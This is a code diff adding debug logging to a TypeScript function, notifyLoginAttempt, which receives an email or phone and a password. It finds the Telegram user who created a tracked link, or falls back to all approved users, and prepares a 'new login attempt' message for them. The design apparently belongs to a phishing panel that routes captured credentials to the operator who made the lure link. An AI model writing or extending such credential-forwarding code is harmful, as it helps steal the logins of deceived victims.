@@ -466,16 +466,25 @@ export async function notifyLoginAttempt(emailOrPhone: string, password: string,
     
     // Find the link creator by contextData
     let targetUsers: any[] = [];
+    console.log('🔍 Looking for link creator with contextData:', contextData);
+    
     if (contextData) {
       // Find the link with this contextData
       const links = await db.select().from(telegramLinks).where(eq(telegramLinks.contextData, contextData));
+      console.log('📊 Found links with contextData:', links.length);
+      
       if (links.length > 0) {
         const linkCreator = links[0];
+        console.log('🔗 Link creator details:', { linkId: linkCreator.linkId, createdBy: linkCreator.createdBy });
+        
         // Get the user who created this link
         const user = await db.select().from(telegramUsers)
           .where(eq(telegramUsers.telegramId, linkCreator.createdBy));
+        console.log('👤 Found link creator user:', user.length > 0 ? user[0].uniqueId : 'none');
+        
         if (user.length > 0 && user[0].isApproved) {
           targetUsers = user;
+          console.log('✅ Targeting specific user:', user[0].uniqueId);
         }
       }
     }
@@ -483,6 +492,7 @@ export async function notifyLoginAttempt(emailOrPhone: string, password: string,
     // Fallback to all approved users if no specific link creator found
     if (targetUsers.length === 0) {
       targetUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
+      console.log('⚠️ Fallback to all approved users:', targetUsers.length);
     }
     
     const message = `🔐 Новая попытка входа\n\n` +
